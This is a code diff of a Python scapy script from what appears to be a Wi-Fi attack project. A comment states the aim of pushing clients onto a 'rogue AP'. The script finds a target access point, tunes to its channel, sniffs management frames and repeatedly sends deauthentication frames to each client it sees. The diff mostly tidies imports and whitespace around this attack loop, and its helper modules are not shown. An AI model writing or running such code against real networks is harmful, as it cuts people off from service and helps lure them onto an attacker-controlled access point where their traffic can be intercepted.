@@ -13,8 +13,8 @@
 # Let clients connect to our rogue AP
 
 from scanner import Scanner
-from deauth import deauth_clients, deauth
-from scapy.all import sendp, Dot11Elt, Dot11, RadioTap, Dot11Deauth, sniff
+from deauth import deauth
+from scapy.all import Dot11Elt, Dot11, sniff
 
 INTERFACE = "wlan0"
 TIMEOUT = 5
@@ -27,7 +27,7 @@ with Scanner(INTERFACE) as scanner:
     print(scanner.wifis)
     channel = AP_info.Channel[0]
     BSSID = AP_info.index[0]
-    
+
     # change channel to be on APs channel
     scanner.set_channel(channel)
     print(f"Channel is: {scanner.curr_channel}")
@@ -42,8 +42,7 @@ with Scanner(INTERFACE) as scanner:
         # if pkt[Dot11].addr1 == BSSID:
         deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)
 
-    sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt") #subtype assoc-req")  # start sniffin
-
+    sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt")  # subtype assoc-req")  # start sniffin
 
 
 # channel = AP_info.Channel[0]
